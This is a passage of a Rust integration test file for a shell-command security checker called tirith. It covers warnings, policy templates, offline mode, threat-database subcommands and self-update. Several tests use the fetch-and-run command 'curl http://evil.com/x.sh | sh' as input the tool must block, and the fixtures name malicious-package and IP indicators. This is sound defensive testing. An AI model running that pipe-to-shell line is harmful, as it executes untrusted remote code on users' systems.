    let policy_dir = tmpdir.path().join("project/.tirith");
    fs::create_dir_all(&policy_dir).unwrap();
    fs::create_dir_all(&state_dir).unwrap();

    let policy = r#"paranoia: 1
escalation:
  - trigger: repeat_count
    rule_ids: ["*"]
    threshold: 3
    action: block
"#;
    fs::write(policy_dir.join("policy.yaml"), policy).unwrap();
    fs::create_dir_all(tmpdir.path().join("project/.git")).unwrap();

    let session_id = format!("test-blocked-warn-{}", std::process::id());
    let project_dir = tmpdir.path().join("project");

    for slug in &["aaa", "bbb", "ccc"] {
        let _ = tirith_isolated(&session_id, &state_dir, &project_dir)
            .args([
                "check",
                "--non-interactive",
                "--no-daemon",
                "--shell",
                "posix",
                "--",
                &format!("curl https://bit.ly/{slug}"),
            ])
            .output()
            .expect("failed to run tirith");
    }

    let out = tirith_isolated(&session_id, &state_dir, &project_dir)
        .args(["warnings", "--json", "--session", &session_id])
        .output()
        .expect("failed to run tirith warnings");
    assert_eq!(out.status.code(), Some(0));

    let stdout = String::from_utf8_lossy(&out.stdout);
    let json: serde_json::Value =
        serde_json::from_str(&stdout).expect("warnings --json should be valid JSON");
    assert_eq!(
        json["total_warnings"], 2,
        "only 2 warnings should be recorded (3rd was blocked, not a warning): {json}"
    );
}

#[test]
fn warnings_clear_resets_session() {
    let tmpdir = tempfile::tempdir().expect("tempdir");
    let state_dir = tmpdir.path().join("state");
    let policy_dir = tmpdir.path().join("project/.tirith");
    fs::create_dir_all(&policy_dir).unwrap();
    fs::create_dir_all(&state_dir).unwrap();

    let policy = "paranoia: 1\n";
    fs::write(policy_dir.join("policy.yaml"), policy).unwrap();
    fs::create_dir_all(tmpdir.path().join("project/.git")).unwrap();

    let session_id = format!("test-clear-{}", std::process::id());
    let project_dir = tmpdir.path().join("project");

    let out = tirith_isolated(&session_id, &state_dir, &project_dir)
        .args([
            "check",
            "--non-interactive",
            "--no-daemon",
            "--shell",
            "posix",
            "--",
            "curl https://bit.ly/abc",
        ])
        .output()
        .expect("failed to run tirith");
    assert_eq!(
        out.status.code(),
        Some(2),
        "shortened URL should warn (exit 2)"
    );

    let out = tirith_isolated(&session_id, &state_dir, &project_dir)
        .args(["warnings", "--json", "--session", &session_id])
        .output()
        .expect("failed to run tirith warnings");
    let json: serde_json::Value =
        serde_json::from_str(&String::from_utf8_lossy(&out.stdout)).unwrap();
    assert!(
        json["total_warnings"].as_u64().unwrap() > 0,
        "should have at least one warning before clear"
    );

    let out = tirith_isolated(&session_id, &state_dir, &project_dir)
        .args(["warnings", "--clear", "--session", &session_id])
        .output()
        .expect("failed to run tirith warnings --clear");
    assert_eq!(out.status.code(), Some(0));

    let out = tirith_isolated(&session_id, &state_dir, &project_dir)
        .args(["warnings", "--json", "--session", &session_id])
        .output()
        .expect("failed to run tirith warnings after clear");
    let json: serde_json::Value =
        serde_json::from_str(&String::from_utf8_lossy(&out.stdout)).unwrap();
    assert_eq!(
        json["total_warnings"], 0,
        "warnings should be 0 after clear: {json}"
    );
}

#[test]
fn paranoia_filters_low_finding_to_allow() {
    let tmpdir = tempfile::tempdir().expect("tempdir");
    let state_dir = tmpdir.path().join("state");
    let policy_dir = tmpdir.path().join("project/.tirith");
    fs::create_dir_all(&policy_dir).unwrap();
    fs::create_dir_all(&state_dir).unwrap();

    // paranoia 1 + LOW override for shortened_url filters the finding out.
    let policy = r#"paranoia: 1
severity_overrides:
  shortened_url: LOW
"#;
    fs::write(policy_dir.join("policy.yaml"), policy).unwrap();
    fs::create_dir_all(tmpdir.path().join("project/.git")).unwrap();

    let session_id = format!("test-paranoia-low-{}", std::process::id());
    let project_dir = tmpdir.path().join("project");

    let out = tirith_isolated(&session_id, &state_dir, &project_dir)
        .args([
            "check",
            "--non-interactive",
            "--no-daemon",
            "--shell",
            "posix",
            "--",
            "curl https://bit.ly/x",
        ])
        .output()
        .expect("failed to run tirith");
    assert_eq!(
        out.status.code(),
        Some(0),
        "LOW finding at paranoia=1 should be filtered to Allow (exit 0), got stderr: {}",
        String::from_utf8_lossy(&out.stderr)
    );
}

#[test]
fn check_warn_only_block_renders_as_detected() {
    let out = tirith()
        .args([
            "check",
            "--warn-only",
            "--shell",
            "posix",
            "--",
            "curl http://evil.com/x.sh | sh",
        ])
        .output()
        .expect("failed to run tirith");
    assert_eq!(
        out.status.code(),
        Some(1),
        "exit code stays 1 in warn-only mode; the flag is human-rendering-only"
    );
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        !stderr.contains("BLOCKED"),
        "warn-only mode must not use 'BLOCKED' banner — got: {stderr}"
    );
    assert!(
        stderr.contains("DETECTED"),
        "warn-only mode must render block verdicts as DETECTED — got: {stderr}"
    );
}

#[test]
fn check_without_warn_only_still_renders_blocked() {
    let out = tirith()
        .args([
            "check",
            "--shell",
            "posix",
            "--",
            "curl http://evil.com/x.sh | sh",
        ])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(1));
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("BLOCKED"),
        "default mode must use BLOCKED banner — got: {stderr}"
    );
    assert!(
        !stderr.contains("DETECTED"),
        "default mode must not render DETECTED — got: {stderr}"
    );
}

#[test]
fn warn_only_json_output_matches_plain_when_timings_stripped() {
    // The --warn-only flag only affects human rendering. Machine output
    // (JSON, audit, webhook) must be byte-identical to the un-flagged run
    // after stripping the per-run `timings_ms` field.
    let input = "curl http://evil.com/x.sh | sh";
    let with_flag = tirith()
        .args([
            "check",
            "--warn-only",
            "--json",
            "--shell",
            "posix",
            "--",
            input,
        ])
        .output()
        .expect("tirith with --warn-only");
    let without_flag = tirith()
        .args(["check", "--json", "--shell", "posix", "--", input])
        .output()
        .expect("tirith without --warn-only");

    let strip = |bytes: &[u8]| -> serde_json::Value {
        let mut v: serde_json::Value = serde_json::from_slice(bytes).expect("parse JSON");
        if let Some(obj) = v.as_object_mut() {
            obj.remove("timings_ms");
        }
        v
    };
    assert_eq!(
        strip(&with_flag.stdout),
        strip(&without_flag.stdout),
        "JSON must be identical except for timings_ms"
    );
    assert_eq!(
        with_flag.status.code(),
        without_flag.status.code(),
        "exit codes must match"
    );
}

// --- `--offline` / `TIRITH_OFFLINE` (roadmap M0.3) -------------------------
//
// The offline switch suppresses the periodic background threat-DB refresh
// that `tirith check` triggers on the hot path. The observable proof that no
// network attempt was made is the absence of the `threatdb-spawned-at`
// breadcrumb file — `tirith check` writes it into the state dir immediately
// before launching the background update child, so no breadcrumb means no
// child and no network.

/// Run `tirith check` against a clean command with an isolated state dir, and
/// return whether the background-update `spawned-at` breadcrumb was written.
#[cfg(unix)]
fn check_left_background_breadcrumb(
    extra_env: &[(&str, &str)],
    extra_args: &[&str],
) -> (bool, i32) {
    let state = tempfile::tempdir().expect("state tempdir");
    let mut args: Vec<&str> = vec!["check", "--shell", "posix"];
    args.extend_from_slice(extra_args);
    args.extend_from_slice(&["--", "ls -la"]);

    let mut cmd = tirith();
    cmd.args(&args)
        .env("XDG_STATE_HOME", state.path())
        // A fresh state dir has no next-check-at file, so the online path is
        // "due" and would write the breadcrumb. Empty HOME-derived dirs are
        // fine; only the breadcrumb presence matters.
        .env_remove("TIRITH_OFFLINE");
    for (k, v) in extra_env {
        cmd.env(k, v);
    }
    let out = cmd.output().expect("failed to run tirith check");
    let breadcrumb = state.path().join("tirith").join("threatdb-spawned-at");
    (breadcrumb.exists(), out.status.code().unwrap_or(-1))
}

/// `tirith check --offline` must not trigger the background threat-DB refresh:
/// no `spawned-at` breadcrumb, and the local verdict is still correct.
#[cfg(unix)]
#[test]
fn check_offline_flag_suppresses_background_update() {
    let (breadcrumb, code) = check_left_background_breadcrumb(&[], &["--offline"]);
    assert!(
        !breadcrumb,
        "--offline must suppress the background threat-DB refresh (no breadcrumb)"
    );
    assert_eq!(
        code, 0,
        "offline check of a clean command must still produce a local Allow verdict"
    );
}

/// `TIRITH_OFFLINE=1` must have the same effect as `--offline` — this is the
/// path the shell hooks and the PTY conformance harness use.
#[cfg(unix)]
#[test]
fn check_offline_env_suppresses_background_update() {
    let (breadcrumb, code) = check_left_background_breadcrumb(&[("TIRITH_OFFLINE", "1")], &[]);
    assert!(
        !breadcrumb,
        "TIRITH_OFFLINE=1 must suppress the background threat-DB refresh (no breadcrumb)"
    );
    assert_eq!(code, 0, "offline check must still produce a local verdict");
}

/// A falsey `TIRITH_OFFLINE` value must NOT activate offline mode — the env
/// var is opt-in and only truthy values count.
#[cfg(unix)]
#[test]
fn check_offline_env_falsey_does_not_suppress() {
    // `TIRITH_OFFLINE=0` is explicitly not offline. We assert the verdict is
    // unaffected; we deliberately do not assert breadcrumb presence here,
    // since whether the online path is "due" depends on global dedup state.
    let (_breadcrumb, code) = check_left_background_breadcrumb(&[("TIRITH_OFFLINE", "0")], &[]);
    assert_eq!(
        code, 0,
        "TIRITH_OFFLINE=0 is not offline; a clean command still exits 0"
    );
}

/// `--approval-check` is the hook-driven path; `--offline` must compose with
/// it so shell hooks can run fully local. The approval temp-file path is
/// still printed on stdout and the breadcrumb is still suppressed.
#[cfg(unix)]
#[test]
fn check_offline_composes_with_approval_check() {
    let state = tempfile::tempdir().expect("state tempdir");
    let out = tirith()
        .args([
            "check",
            "--shell",
            "posix",
            "--offline",
            "--approval-check",
            "--",
            "ls -la",
        ])
        .env("XDG_STATE_HOME", state.path())
        .env_remove("TIRITH_OFFLINE")
        .output()
        .expect("failed to run tirith check");
    assert_eq!(
        out.status.code(),
        Some(0),
        "offline approval-check of a clean command should exit 0"
    );
    let breadcrumb = state.path().join("tirith").join("threatdb-spawned-at");
    assert!(
        !breadcrumb.exists(),
        "--offline must suppress the background refresh even on the approval-check path"
    );
}

/// Roadmap item 23: `tirith policy init --template <name>` must write a valid
/// policy for each curated template, and `tirith policy validate` must then
/// pass on it. Exercises the real binary end-to-end (init → validate).
#[test]
fn policy_init_templates_generate_and_validate() {
    for template in ["individual", "ci-strict", "ai-agent-heavy"] {
        let dir = tempfile::tempdir().expect("tempdir");

        let init = tirith()
            .args(["policy", "init", "--template", template])
            .current_dir(dir.path())
            .env_remove("TIRITH_POLICY_ROOT")
            .output()
            .expect("failed to run tirith policy init");
        assert_eq!(
            init.status.code(),
            Some(0),
            "policy init --template {template} should exit 0: {}",
            String::from_utf8_lossy(&init.stderr)
        );

        let policy_path = dir.path().join(".tirith/policy.yaml");
        assert!(
            policy_path.exists(),
            "policy init --template {template} should write {}",
            policy_path.display()
        );

        let validate = tirith()
            .args(["policy", "validate"])
            .current_dir(dir.path())
            .env_remove("TIRITH_POLICY_ROOT")
            .output()
            .expect("failed to run tirith policy validate");
        let stderr = String::from_utf8_lossy(&validate.stderr);
        assert_eq!(
            validate.status.code(),
            Some(0),
            "policy validate must pass on the {template} template: {stderr}"
        );
        assert!(
            stderr.contains("valid, no issues"),
            "policy validate on {template} template should report no issues: {stderr}"
        );
    }
}

/// An unrecognized `--template` name must fail fast with exit 1 and list the
/// valid template names. `fintech` / `windows-enterprise` are deliberately
/// deferred and must be rejected.
#[test]
fn policy_init_rejects_unknown_template() {
    let dir = tempfile::tempdir().expect("tempdir");
    let out = tirith()
        .args(["policy", "init", "--template", "fintech"])
        .current_dir(dir.path())
        .env_remove("TIRITH_POLICY_ROOT")
        .output()
        .expect("failed to run tirith policy init");
    assert_eq!(out.status.code(), Some(1), "unknown template should exit 1");
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("unknown template 'fintech'"),
        "error should name the bad template: {stderr}"
    );
    assert!(
        stderr.contains("individual")
            && stderr.contains("ci-strict")
            && stderr.contains("ai-agent-heavy"),
        "error should list valid templates: {stderr}"
    );
    assert!(
        !dir.path().join(".tirith/policy.yaml").exists(),
        "a rejected template must not write a policy file"
    );
}

/// `tirith policy init` with no `--template` must keep writing the default
/// full template — the new option must not change default behavior.
#[test]
fn policy_init_default_unchanged_without_template() {
    let dir = tempfile::tempdir().expect("tempdir");
    let out = tirith()
        .args(["policy", "init"])
        .current_dir(dir.path())
        .env_remove("TIRITH_POLICY_ROOT")
        .output()
        .expect("failed to run tirith policy init");
    assert_eq!(out.status.code(), Some(0), "default init should exit 0");

    let body = fs::read_to_string(dir.path().join(".tirith/policy.yaml"))
        .expect("default init should write policy.yaml");
    // The default (full) template carries the section comments the curated
    // templates' headers do not — a cheap discriminator that it is unchanged.
    assert!(
        body.contains("# Tirith security policy") && body.contains("# Paranoia level (1-4)"),
        "default init should still write the full template: {body}"
    );
}

/// #112: `tirith policy validate` (no --file) must locate a present-but-corrupt
/// policy and report its error, rather than collapsing to "no policy file found"
/// the way the old parse-aware discovery (`Policy::discover().path`) did.
#[test]
fn policy_validate_finds_present_but_corrupt_policy() {
    let dir = tempfile::tempdir().expect("tempdir");
    let tirith_dir = dir.path().join(".tirith");
    fs::create_dir_all(&tirith_dir).expect("create .tirith");
    // Unparseable YAML: `Policy::discover` would parse this, fail, and drop the
    // path — so the old resolver reported "no policy file found".
    fs::write(tirith_dir.join("policy.yaml"), "{{invalid yaml\n").expect("write policy");

    let out = tirith()
        .args(["policy", "validate"])
        .current_dir(dir.path())
        .env_remove("TIRITH_POLICY_ROOT")
        .output()
        .expect("failed to run tirith");

    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        !stderr.contains("no policy file found"),
        "validate must locate the present policy, not claim none exists: {stderr}"
    );
    assert!(
        stderr.contains("YAML parse error"),
        "validate must report the corrupt policy's parse error: {stderr}"
    );
    assert_eq!(
        out.status.code(),
        Some(1),
        "a corrupt policy is an error-level issue (exit 1)"
    );
}

/// F3 (end-to-end): `tirith doctor --compat` must surface `TIRITH_STATUS` even
/// for a non-bash shell. Reproduces the exact reported case —
/// `SHELL=/bin/zsh TIRITH_STATUS=degraded tirith doctor --compat` — and asserts
/// the protection-status line is present in the human report. Before the fix
/// that line was printed only inside the bash-only branch and was dropped here.
#[test]
fn doctor_compat_surfaces_tirith_status_for_non_bash_shell() {
    let out = tirith()
        .args(["doctor", "--compat"])
        .env("SHELL", "/bin/zsh")
        .env("TIRITH_STATUS", "degraded")
        // Keep detection from latching onto a bash mode left in the ambient env.
        .env_remove("TIRITH_BASH_MODE")
        .env_remove("TIRITH_BASH_EFFECTIVE_MODE")
        .output()
        .expect("failed to run tirith doctor --compat");
    assert_eq!(out.status.code(), Some(0), "doctor --compat should exit 0");

    let stdout = String::from_utf8_lossy(&out.stdout);
    assert!(
        stdout.contains("protection status:    DEGRADED"),
        "doctor --compat must surface TIRITH_STATUS=degraded regardless of shell; \
         got:\n{stdout}"
    );
}

// ===========================================================================
// Threat-DB transparency subcommands (roadmap M2 item 11):
// `threat-db explain | sources | health | diff`.
//
// These exercise the real binary against the signed fixture DB at
// `tests/fixtures/test-threatdb.dat`. Each test isolates `XDG_STATE_HOME` so
// the snapshot-history file is written into a tempdir, never the real home.
// ===========================================================================

/// Path to the signed test threat DB fixture.
fn test_threatdb_fixture() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../tests/fixtures/test-threatdb.dat")
}

/// Run `tirith threat-db <args>` with the fixture DB and an isolated state dir.
/// Returns (stdout, stderr, exit_code).
fn run_threatdb(args: &[&str], state: &std::path::Path) -> (String, String, i32) {
    let fixture = test_threatdb_fixture();
    let out = tirith()
        .arg("threat-db")
        .args(args)
        .env("TIRITH_THREATDB_PATH", &fixture)
        .env("XDG_STATE_HOME", state)
        .env_remove("TIRITH_THREATDB_SUPPLEMENTAL_PATH")
        .output()
        .expect("failed to run tirith threat-db");
    (
        String::from_utf8_lossy(&out.stdout).to_string(),
        String::from_utf8_lossy(&out.stderr).to_string(),
        out.status.code().unwrap_or(-1),
    )
}

#[test]
fn threatdb_explain_known_malicious_package() {
    let state = tempfile::tempdir().unwrap();
    let (stdout, _err, code) = run_threatdb(
        &["explain", "npm:evil-package@1.0.0", "--format", "json"],
        state.path(),
    );
    assert_eq!(code, 0, "explain should exit 0");
    let v: serde_json::Value = serde_json::from_str(&stdout).expect("explain JSON");
    assert_eq!(v["present"], true, "evil-package@1.0.0 must be present");
    assert_eq!(v["kind"], "package");
    assert_eq!(v["findings"][0]["classification"], "malicious_package");
    assert_eq!(v["findings"][0]["source"], "ossf_malicious");
}

#[test]
fn threatdb_explain_absent_indicator_says_so() {
    let state = tempfile::tempdir().unwrap();
    let (stdout, _err, code) =
        run_threatdb(&["explain", "definitely-not-in-db.example"], state.path());
    assert_eq!(code, 0);
    assert!(
        stdout.contains("not present"),
        "an absent indicator must be reported plainly; got:\n{stdout}"
    );
    assert!(
        stdout.contains("not a guarantee of safety"),
        "explain must caveat that absence is not safety; got:\n{stdout}"
    );
}

#[test]
fn threatdb_explain_typosquat_and_lookalike() {
    // `reacct` is a known typosquat of `react` in the fixture, and is also
    // edit-distance 1 from the popular package `react`.
    let state = tempfile::tempdir().unwrap();
    let (stdout, _err, code) =
        run_threatdb(&["explain", "reacct", "--format", "json"], state.path());
    assert_eq!(code, 0);
    let v: serde_json::Value = serde_json::from_str(&stdout).expect("explain JSON");
    assert_eq!(v["present"], true);
    let classes: Vec<&str> = v["findings"]
        .as_array()
        .unwrap()
        .iter()
        .map(|f| f["classification"].as_str().unwrap())
        .collect();
    assert!(classes.contains(&"typosquat"), "got {classes:?}");
    assert!(classes.contains(&"popular_lookalike"), "got {classes:?}");
}

#[test]
fn threatdb_explain_ip_indicator() {
    // 203.0.113.50 is a Feodo Tracker IP in the fixture DB.
    let state = tempfile::tempdir().unwrap();
    let (stdout, _err, code) = run_threatdb(
        &["explain", "203.0.113.50", "--format", "json"],
        state.path(),
    );
    assert_eq!(code, 0);
    let v: serde_json::Value = serde_json::from_str(&stdout).expect("explain JSON");
    assert_eq!(v["kind"], "ip");
    assert_eq!(v["present"], true);
    assert_eq!(v["findings"][0]["classification"], "malicious_ip");
    assert_eq!(v["findings"][0]["source"], "feodo_tracker");
}

#[test]
fn threatdb_sources_lists_all_feeds_with_counts() {
    let state = tempfile::tempdir().unwrap();
    let (stdout, _err, code) = run_threatdb(&["sources", "--format", "json"], state.path());
    assert_eq!(code, 0, "sources should exit 0");
    let v: serde_json::Value = serde_json::from_str(&stdout).expect("sources JSON");
    assert_eq!(v["db_installed"], true);
    let sources = v["sources"].as_array().expect("sources array");
    // All 11 ThreatSource variants must be listed.
    assert_eq!(sources.len(), 11, "every threat source must be listed");
    // The fixture has 2 OSSF-malicious package records.
    let ossf = sources
        .iter()
        .find(|s| s["id"] == "ossf_malicious")
        .expect("ossf_malicious source");
    assert_eq!(ossf["record_count"], 2);
    assert_eq!(ossf["tier"], "primary");
    // A supplemental source must be tagged supplemental and have 0 records
    // (the fixture has no supplemental overlay).
    let urlhaus = sources
        .iter()
        .find(|s| s["id"] == "urlhaus")
        .expect("urlhaus source");
    assert_eq!(urlhaus["tier"], "supplemental");
    assert_eq!(urlhaus["record_count"], 0);
}

#[test]
fn threatdb_sources_human_groups_by_tier() {
    let state = tempfile::tempdir().unwrap();
    let (stdout, _err, code) = run_threatdb(&["sources"], state.path());
    assert_eq!(code, 0);
    assert!(
        stdout.contains("Primary feeds") && stdout.contains("Supplemental feeds"),
        "sources must group feeds by tier; got:\n{stdout}"
    );
}

#[test]
fn threatdb_health_reports_counts_and_signature() {
    let state = tempfile::tempdir().unwrap();
    let (stdout, _err, code) = run_threatdb(&["health", "--format", "json"], state.path());
    assert_eq!(code, 0, "health on a loadable DB should exit 0");
    let v: serde_json::Value = serde_json::from_str(&stdout).expect("health JSON");
    assert_eq!(v["installed"], true);
    // The fixture DB is signed with the embedded key, so the signature verifies.
    assert_eq!(v["signature_valid"], true);
    // Fixture has 3 packages, 1 IP, 2 typosquats, 4 popular = 10 total.
    assert_eq!(v["counts"]["packages"], 3);
    assert_eq!(v["counts"]["ips"], 1);
    assert_eq!(v["counts"]["typosquats"], 2);
    assert_eq!(v["counts"]["popular"], 4);
    // The fixture's build timestamp is far in the past, so it is stale.
    assert_eq!(v["stale"], true);
    assert_eq!(v["status"], "stale");
}

#[test]
fn threatdb_health_not_installed_reports_cleanly() {
    let state = tempfile::tempdir().unwrap();
    // Point at a path that does not exist.
    let out = tirith()
        .args(["threat-db", "health", "--format", "json"])
        .env("TIRITH_THREATDB_PATH", state.path().join("missing.dat"))
        .env("XDG_STATE_HOME", state.path())
        .output()
        .expect("failed to run tirith threat-db health");
    assert_eq!(out.status.code(), Some(0), "absent DB is not an error");
    let v: serde_json::Value = serde_json::from_slice(&out.stdout).expect("health JSON");
    assert_eq!(v["installed"], false);
    assert_eq!(v["status"], "not_installed");
}

#[test]
fn threatdb_diff_without_baseline_states_limitation() {
    let state = tempfile::tempdir().unwrap();
    let (stdout, _err, code) =
        run_threatdb(&["diff", "--since", "1", "--format", "json"], state.path());
    assert_eq!(code, 0);
    let v: serde_json::Value = serde_json::from_str(&stdout).expect("diff JSON");
    // The DB-format-has-no-history limitation must always be stated.
    assert!(
        v["limitation"]
            .as_str()
            .unwrap()
            .contains("no per-entry history"),
        "diff must honestly state the no-history limitation"
    );
    // With no earlier snapshot, there is no delta and a note explains why.
    assert!(v["delta"].is_null());
    assert!(v["note"].as_str().unwrap().contains("No snapshot"));
}

#[test]
fn threatdb_diff_rejects_unparseable_since() {
    let state = tempfile::tempdir().unwrap();
    let (_out, err, code) = run_threatdb(&["diff", "--since", "not-a-thing"], state.path());
    assert_eq!(code, 1, "an unparseable --since must exit non-zero");
    assert!(
        err.contains("could not parse"),
        "diff must report the parse failure on stderr; got:\n{err}"
    );
}

#[test]
fn threatdb_diff_computes_delta_against_seeded_snapshot() {
    // Seed an older snapshot (DB version 40) directly into the history file,
    // then `diff --since 40` against the current fixture DB (version 42).
    let state = tempfile::tempdir().unwrap();
    let tirith_state = state.path().join("tirith");
    std::fs::create_dir_all(&tirith_state).unwrap();
    let seeded = r#"{"recorded_at":1700000000,"build_sequence":40,"build_timestamp":1699000000,"signature_valid":true,"counts":{"packages":1,"hostnames":0,"ips":0,"typosquats":1,"popular":4},"sources":{"ossf_malicious":1}}"#;
    std::fs::write(tirith_state.join("threatdb-history.jsonl"), seeded).unwrap();

    let (stdout, _err, code) =
        run_threatdb(&["diff", "--since", "40", "--format", "json"], state.path());
    assert_eq!(code, 0);
    let v: serde_json::Value = serde_json::from_str(&stdout).expect("diff JSON");
    assert_eq!(v["baseline"]["build_sequence"], 40);
    assert_eq!(v["current"]["build_sequence"], 42);
    // Fixture has 3 packages vs seeded 1 → +2; 1 IP vs 0 → +1; 2 typo vs 1 → +1.
    assert_eq!(v["delta"]["packages"], 2);
    assert_eq!(v["delta"]["ips"], 1);
    assert_eq!(v["delta"]["typosquats"], 1);
    assert_eq!(v["delta"]["total"], 4);
}

#[test]
fn threatdb_transparency_commands_write_snapshot_history() {
    // Any transparency command run against an installed DB must fold a
    // snapshot into the history file, so `diff` accrues a usable trail.
    let state = tempfile::tempdir().unwrap();
    let (_out, _err, code) = run_threatdb(&["health"], state.path());
    assert_eq!(code, 0);
    let history = state.path().join("tirith").join("threatdb-history.jsonl");
    assert!(
        history.exists(),
        "a transparency command must record a DB snapshot"
    );
    let content = std::fs::read_to_string(&history).unwrap();
    assert!(
        content.contains("\"build_sequence\":42"),
        "snapshot must capture the fixture DB version; got:\n{content}"
    );
}

#[test]
fn threatdb_alias_threatdb_still_works() {
    // The canonical spelling is `threat-db`; `threatdb` must remain a working
    // alias.
    let out = tirith()
        .args(["threatdb", "sources", "--format", "json"])
        .env("TIRITH_THREATDB_PATH", test_threatdb_fixture())
        .env("XDG_STATE_HOME", tempfile::tempdir().unwrap().path())
        .output()
        .expect("failed to run tirith threatdb");
    assert_eq!(
        out.status.code(),
        Some(0),
        "the `threatdb` alias must still work"
    );
    let v: serde_json::Value = serde_json::from_slice(&out.stdout).expect("sources JSON via alias");
    assert_eq!(v["sources"].as_array().unwrap().len(), 11);
}

// ===========================================================================
// verify-self / update / version --provenance  (M2 item 24)
//
// These tests run the CLI end-to-end. They MUST NOT touch the network: the
// test binary is a debug build, so `verify-self` and `update` take the
// dev-build short-circuit and never make an HTTP request. The rollback test
// exercises only the local filesystem swap. No test replaces a real install.
// ===========================================================================

/// `tirith version` (no flags) prints the plain version line.
#[test]
fn version_plain_prints_version() {
    let out = tirith()
        .args(["version"])
        .output()
        .expect("failed to run tirith version");
    assert_eq!(out.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert!(
        stdout.starts_with("tirith "),
        "version output should start with `tirith `, got: {stdout}"
    );
    assert!(
        stdout.trim().chars().filter(|c| *c == '.').count() >= 2,
        "version output should contain a semver-shaped version, got: {stdout}"
    );
}

/// `tirith version --provenance` reports build info, install method, and an
/// honest verification status — never a falsely-confident "verified".
#[test]
fn version_provenance_reports_install_method_and_honest_status() {
    let out = tirith()
        .args(["version", "--provenance"])
        .output()
        .expect("failed to run tirith version --provenance");
    assert_eq!(out.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert!(stdout.contains("install method:"), "got: {stdout}");
    assert!(stdout.contains("verification:"), "got: {stdout}");
    assert!(stdout.contains("build profile:"), "got: {stdout}");
    // The test binary is a debug build; provenance must NOT claim "verified".
    assert!(
        !stdout.contains("verified (signed"),
        "a dev build must never report a verified-signed status, got: {stdout}"
    );
}

/// `tirith version --provenance --format json` emits a stable JSON object.
#[test]
fn version_provenance_json_shape() {
    let out = tirith()
        .args(["version", "--provenance", "--format", "json"])
        .output()
        .expect("failed to run tirith version --provenance --format json");
    assert_eq!(out.status.code(), Some(0));
    let v: serde_json::Value =
        serde_json::from_slice(&out.stdout).expect("provenance JSON should parse");
    assert!(v["version"].is_string());
    assert!(v["install_method"].is_string());
    assert!(v["verification_status"].is_string());
    assert!(v["dev_build"].is_boolean());
    // The test binary is a debug build → dev_build true, status not verified.
    assert_eq!(v["dev_build"], serde_json::Value::Bool(true));
    assert_eq!(v["verification_status"], "unverified");
}

/// `tirith verify-self` on a dev build reports UNVERIFIED honestly and exits 0
/// (an honest "cannot verify" is not a failure). It must NOT hit the network.
#[test]
fn verify_self_dev_build_is_honestly_unverified() {
    let out = tirith()
        .args(["verify-self"])
        .output()
        .expect("failed to run tirith verify-self");
    // Exit 0: unverified-for-a-benign-reason is not an error.
    assert_eq!(
        out.status.code(),
        Some(0),
        "verify-self on a dev build should exit 0 (honest unverified)"
    );
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert!(
        stdout.contains("UNVERIFIED"),
        "verify-self should say UNVERIFIED for a dev build, got: {stdout}"
    );
    assert!(
        !stdout.contains("VERIFIED (signed") && !stdout.contains("VERIFIED (checksum"),
        "verify-self must never falsely claim a dev build is verified, got: {stdout}"
    );
}

/// `tirith verify-self --format json` on a dev build: status unverified,
/// integrity_ok false.
#[test]
fn verify_self_json_dev_build_not_integrity_ok() {
    let out = tirith()
        .args(["verify-self", "--format", "json"])
        .output()
        .expect("failed to run tirith verify-self --format json");
    assert_eq!(out.status.code(), Some(0));
    let v: serde_json::Value =
        serde_json::from_slice(&out.stdout).expect("verify-self JSON should parse");
    assert_eq!(v["verification_status"], "unverified");
    assert_eq!(v["integrity_ok"], serde_json::Value::Bool(false));
}

/// `tirith update` on an install tirith cannot identify must NOT self-modify;
/// it advises and exits 0.
#[test]
fn update_unknown_install_advises_and_does_not_modify() {
    let out = tirith()
        .args(["update"])
        .output()
        .expect("failed to run tirith update");
    assert_eq!(out.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert!(
        stdout.contains("could not determine how it was installed")
            || stdout.contains("installed via"),
        "update on an unknown install should advise, got: {stdout}"
    );
    assert!(
        stdout.contains("NOT self-modify") || stdout.contains("not self-modify"),
        "update must state it will not self-modify, got: {stdout}"
    );
}

/// `tirith update --format json` on an unknown install yields the
/// use-package-manager action.
#[test]
fn update_unknown_install_json_action() {
    let out = tirith()
        .args(["update", "--format", "json"])
        .output()
        .expect("failed to run tirith update --format json");
    assert_eq!(out.status.code(), Some(0));
    let v: serde_json::Value =
        serde_json::from_slice(&out.stdout).expect("update JSON should parse");
    assert_eq!(v["action"], "use-package-manager");
}

/// `tirith update --rollback` on a non-self-managed install is refused with a
/// clear message and a non-zero exit — rollback is self-managed-only.
#[test]
fn update_rollback_refused_for_non_self_managed() {
    let out = tirith()
        .args(["update", "--rollback"])
        .output()
        .expect("failed to run tirith update --rollback");
    assert_eq!(
        out.status.code(),
        Some(1),
        "rollback on a non-self-managed install should exit non-zero"
    );
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert!(
        stdout.contains("--rollback only applies to a self-managed"),
        "rollback should explain the self-managed restriction, got: {stdout}"
    );
}

/// `--verify` and `--rollback` are mutually exclusive (clap-enforced).
#[test]
fn update_verify_and_rollback_conflict() {
    let out = tirith()
        .args(["update", "--verify", "--rollback"])
        .output()
        .expect("failed to run tirith update --verify --rollback");
    assert_ne!(
        out.status.code(),
        Some(0),
        "--verify and --rollback together should be rejected"
    );
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("cannot be used with") || stderr.contains("conflict"),
        "clap should report the --verify/--rollback conflict, got: {stderr}"
    );
}

/// End-to-end rollback of a SELF-MANAGED install, with no network: a tirith
/// binary placed under a `.local/bin` path (so it self-detects as
/// self-managed) plus a `.tirith-previous` backup is rolled back, and the
/// live binary's bytes become the backup's bytes.
///
/// This exercises the real binary self-replacement path — the most
/// security-critical mutation — without touching the network or any real
/// install.
#[cfg(unix)]
#[test]
fn update_rollback_self_managed_restores_previous_binary() {
    use std::os::unix::fs::PermissionsExt;

    let home = tempfile::tempdir().expect("tempdir");
    // `.local/bin/tirith` makes detect_install_method classify it self-managed.
    let bin_dir = home.path().join(".local").join("bin");
    fs::create_dir_all(&bin_dir).unwrap();
    let live = bin_dir.join("tirith");

